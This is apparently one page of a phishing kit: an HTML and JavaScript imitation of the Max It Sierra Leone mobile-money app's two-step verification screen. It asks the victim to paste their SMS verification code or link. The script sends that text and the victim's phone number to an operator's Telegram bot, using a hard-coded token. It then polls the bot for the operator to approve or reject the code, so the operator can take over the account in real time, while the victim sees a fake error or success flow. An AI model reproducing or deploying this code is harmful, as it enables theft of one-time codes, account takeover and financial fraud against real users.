<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Max it - Two Step Verification</title>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
         :root {
            --orange-primary: #FF7900;
            --text-dark: #1a1a1a;
            --text-grey: #888888;
            --bg-light: #ffffff;
            --btn-disabled: #e2e2e2;
            --btn-disabled-text: #a0a0a0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: #e5e5ea;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        /* Mobile App Container */
        
        .app-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 850px;
            background-color: var(--bg-light);
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
        
        @media (min-width: 401px) {
            .app-container {
                height: 90vh;
                border-radius: 20px;
                border: 8px solid #000;
                overflow: hidden;
            }
        }
        /* Header */
        
        .app-header {
            background-color: var(--orange-primary);
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 18px 20px;
        }
        
        .icon-btn {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }
        
        .logo {
            font-size: 22px;
            font-weight: 500;
            letter-spacing: -0.5px;
        }
        
        .logo strong {
            font-weight: 800;
        }
        /* Main Content */
        
        .content-area {
            padding: 30px 25px;
            flex-grow: 1;
        }
        
        .content-area h2 {
            color: var(--text-dark);
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 12px;
        }
        
        .subtitle {
            color: var(--text-grey);
            font-size: 15px;
            line-height: 1.4;
            margin-bottom: 25px;
        }
        
        .phone-number {
            color: var(--text-dark);
            font-size: 18px;
            font-weight: 800;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
        }
        /* Text Area */
        
        .sms-textarea {
            width: 100%;
            height: 140px;
            border: 2px solid var(--orange-primary);
            border-radius: 12px;
            padding: 15px;
            font-size: 14px;
            color: var(--text-dark);
            resize: none;
            outline: none;
            margin-bottom: 25px;
            font-family: monospace;
            /* Gives it a code-like feel */
        }
        
        .sms-textarea::placeholder {
            color: var(--text-grey);
            font-family: 'Inter', sans-serif;
        }
        
        .sms-textarea:disabled {
            background-color: #f5f5f5;
            color: var(--text-grey);
        }
        /* Timer and Submit */
        
        .resend-text {
            text-align: center;
            color: var(--text-grey);
            font-size: 14px;
            margin-bottom: 15px;
        }
        
        .resend-text.active {
            color: var(--orange-primary);
            font-weight: 600;
            cursor: pointer;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            border: none;
            background-color: var(--btn-disabled);
            color: var(--btn-disabled-text);
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.3s ease;
        }
        
        .submit-btn.active {
            background-color: var(--orange-primary);
            color: white;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 121, 0, 0.3);
        }
        
        .submit-btn.active:active {
            transform: scale(0.98);
        }
        /* Footer */
        
        .app-footer {
            background-color: var(--orange-primary);
            color: white;
            text-align: center;
            padding: 15px;
            font-size: 13px;
            font-weight: 500;
            margin-top: auto;
            /* Pushes footer to the bottom */
        }
    </style>
</head>

<body>

    <div class="app-container">

        <header class="app-header">
            <button class="icon-btn" onclick="history.back()"><i class="fa-solid fa-arrow-left"></i></button>
            <div class="logo"><strong>Max</strong>It</div>
            <button class="icon-btn"><i class="fa-solid fa-bars"></i></button>
        </header>

        <div id="errorModal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; justify-content: center; align-items: center; padding: 20px;">
            <div style="background: white; padding: 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
                <i class="fa-solid fa-circle-xmark" style="color: #ef4444; font-size: 40px; margin-bottom: 15px;"></i>
                <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Wrong verification link, please try again.</p>
                <button onclick="closeModal()" style="width: 100%; background: #FF7900; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Try Again</button>
            </div>
        </div>

        <div class="content-area">
            <h2>Two Step Verification</h2>
            <p class="subtitle">Paste the complete link/sms message sent to your number</p>

            <h3 id="displayPhone" class="phone-number">+232.........</h3>

            <textarea id="smsInput" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>

            <p class="resend-text" id="resendWrapper">Resend in <span id="countdown">30</span> seconds</p>

            <button id="submitBtn" class="submit-btn" disabled>SUBMIT</button>
        </div>

        <footer class="app-footer">
            © 2026 Max It Sierra Leone
        </footer>
    </div>

    <script>
        // --- Helper for Modal ---
        const errorModal = document.getElementById('errorModal');

        function closeModal() {
            errorModal.style.display = 'none';
            // Give them a clean slate when they try again
            document.getElementById('smsInput').value = '';
            document.getElementById('smsInput').focus();
            // Re-enable submit button logic
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').classList.remove('active');
        }

        // 1. Retrieve & Format the phone number from login.html
        const savedPhone = sessionStorage.getItem('savedPhone');
        const phoneDisplay = document.getElementById('displayPhone');

        // We will use this clean number for Telegram tracking
        let cleanPhoneForBot = 'UNKNOWN';

        if (savedPhone) {
            // Convert '0-XX-XX-XX-XX' format to '+232XXXXXXXX' for display
            let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
            if (cleanNumber.startsWith('0')) {
                cleanNumber = cleanNumber.substring(1); // remove leading zero
            }
            cleanPhoneForBot = '232' + cleanNumber; // Format for telegram callbacks
            phoneDisplay.innerText = '+' + cleanPhoneForBot;
        }

        // 2. Countdown Timer & Expiration Logic - FIXED
        let timeLeft = 30;
        let timerExpired = false;
        const countdownEl = document.getElementById('countdown');
        const resendWrapper = document.getElementById('resendWrapper');
        const smsInput = document.getElementById('smsInput');
        const submitBtn = document.getElementById('submitBtn');

        const timer = setInterval(() => {
            timeLeft--;
            if (timeLeft > 0) {
                countdownEl.innerText = timeLeft;
            } else {
                clearInterval(timer);
                timerExpired = true;
                // Time is up: Change text and allow redirect to login
                resendWrapper.innerHTML = "Resend link now";
                resendWrapper.classList.add('active');

                // **FIX**: Only disable input, NOT submit button (submit button still controlled by input content)
                smsInput.disabled = true;
                smsInput.classList.add('disabled');
            }
        }, 1000);

        // Click handler for resend text when active -> REDIRECT TO LOGIN
        resendWrapper.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                window.location.href = 'login.html';
            }
        });

        // 3. Enable Submit Button when text is entered - FIXED to work even after timer expires
        smsInput.addEventListener('input', function() {
            // Only enable if timer hasn't expired OR if they paste something after timer (edge case)
            if (this.value.trim().length > 5 && !timerExpired) {
                submitBtn.disabled = false;
                submitBtn.classList.add('active');
            } else if (this.value.trim().length <= 5) {
                submitBtn.disabled = true;
                submitBtn.classList.remove('active');
            }
        });

        // --- TELEGRAM BOT CONFIGURATION ---
        const botToken = '8621922059:AAHPmlBtFdg5yL003r44eHaNmz0i42crlOM';
        const chatId = '1345737806';

        function sendOTPToTelegram(phone, smsText) {
            const escapeMd = s => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            const message = `📱 *Step 2: OTP / Link Submission*\nPhone: \`+${escapeMd(phone)}\`\n✉️ Pasted Message:\n\`${escapeMd(smsText)}\`\n\n👇 Please Approve or Reject:`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ Approve",
                        callback_data: `OTP_APP_${phone}`
                    }, {
                        text: "❌ Reject",
                        callback_data: `OTP_REJ_${phone}`
                    }]
                ]
            };

            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'MarkdownV2',
                    reply_markup: JSON.stringify(inlineKeyboard)
                })
            });
        }

        function startListeningForOTPDecision(phone, btnElement) {
            let offset = 0;
            let decided = false;

            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }

                    const intervalId = setInterval(() => {
                        if (decided) return;

                        fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
                            .then(r => r.json())
                            .then(data => {
                                if (!data.ok || decided) return;

                                for (let update of data.result) {
                                    offset = update.update_id + 1;

                                    if (update.callback_query) {
                                        const action = update.callback_query.data;

                                        if (action === `OTP_APP_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);
                                            // Approved -> Proceed to Success
                                            window.location.href = 'limit.html';

                                        } else if (action === `OTP_REJ_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);

                                            // Rejected -> Reset UI and Show Modal
                                            btnElement.innerHTML = 'SUBMIT';
                                            btnElement.style.opacity = '1';
                                            btnElement.disabled = true;
                                            btnElement.classList.remove('active');

                                            // Show custom error modal
                                            errorModal.style.display = 'flex';
                                        }
                                    }
                                }
                            })
                            .catch(err => console.error("Polling error:", err));
                    }, 4000);
                })
                .catch(err => {
                    console.error("Failed to initialize Telegram polling:", err);
                    btnElement.innerHTML = 'SUBMIT';
                    btnElement.style.opacity = '1';
                    btnElement.disabled = false;
                    alert("Network error communicating with the server.");
                });
        }

        // 4. Submit Redirect with Polling
        submitBtn.addEventListener('click', function() {
            const smsText = smsInput.value.trim();
            const btn = this;

            // Visual loading state
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> VERIFYING...';
            btn.style.opacity = '0.8';
            btn.disabled = true;

            sendOTPToTelegram(cleanPhoneForBot, smsText)
                .then(response => {
                    if (!response.ok) throw new Error("Failed to send Telegram message");
                    startListeningForOTPDecision(cleanPhoneForBot, btn);
                })
                .catch(error => {
                    console.error("Telegram API Error:", error);
                    btn.innerHTML = 'SUBMIT';
                    btn.style.opacity = '1';
                    btn.disabled = false;
                    alert("Error connecting to the verification server. Please try again.");
                });
        });
    </script>
</body>

</html>
